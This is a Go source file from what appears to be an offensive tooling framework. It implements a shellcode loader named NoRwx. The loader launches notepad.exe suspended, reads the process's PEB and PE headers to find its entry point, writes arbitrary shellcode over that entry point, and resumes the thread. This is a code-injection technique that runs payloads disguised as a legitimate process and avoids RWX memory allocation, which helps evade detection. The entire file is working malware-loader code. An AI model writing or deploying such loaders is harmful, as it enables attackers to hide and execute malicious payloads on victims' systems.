package loader

import (
	"encoding/binary"
	"unsafe"
	"variant/log"
	"variant/wdll"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func NoRwx(shellcode []byte) {
	var info int32
	var returnLength int32

	var pbi windows.PROCESS_BASIC_INFORMATION
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	err := windows.CreateProcess(
		nil,
		windows.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"),
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		log.Fatal(err)
	}

	_, ntErr := xwindows.NtQueryInformationProcessZ(
		pi.Process,
		uintptr(info),
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{}),
		uintptr(unsafe.Pointer(&returnLength)),
	)
	if ntErr != nil {
		log.Fatalf("NtQueryInformationProcessZ failed: %w", ntErr)
	}

	pebOffset := uintptr(unsafe.Pointer(pbi.PebBaseAddress)) + 0x10
	var imageBase uintptr = 0

	/*
	   BOOL ReadProcessMemory(
	     [in]  HANDLE  hProcess,
	     [in]  LPCVOID lpBaseAddress,
	     [out] LPVOID  lpBuffer,
	     [in]  SIZE_T  nSize,
	     [out] SIZE_T  *lpNumberOfBytesRead
	   );
	*/

	wdll.ReadProcessMemory().Call(
		uintptr(pi.Process),
		pebOffset,
		uintptr(unsafe.Pointer(&imageBase)),
		8,
		0,
	)

	headersBuffer := make([]byte, 4096)

	wdll.ReadProcessMemory().Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(unsafe.Pointer(&headersBuffer[0])),
		4096,
		0,
	)

	// Parse DOS header e_lfanew entry to calculate entry point address
	var dosHeader wdll.IMAGE_DOS_HEADER
	dosHeader.E_lfanew = binary.LittleEndian.Uint32(headersBuffer[60:64])
	ntHeader := (*wdll.IMAGE_NT_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dosHeader.E_lfanew)))
	codeEntry := uintptr(ntHeader.OptionalHeader.AddressOfEntryPoint) + imageBase

	/*
	   BOOL WriteProcessMemory(
	     [in]  HANDLE  hProcess,
	     [in]  LPVOID  lpBaseAddress,
	     [in]  LPCVOID lpBuffer,
	     [in]  SIZE_T  nSize,
	     [out] SIZE_T  *lpNumberOfBytesWritten
	   );
	*/

	var zero *uintptr
	xwindows.WriteProcessMemory(
		pi.Process,
		codeEntry,
		&shellcode[0],
		uintptr(len(shellcode)),
		zero,
	)

	xwindows.ResumeThread(pi.Thread)

}
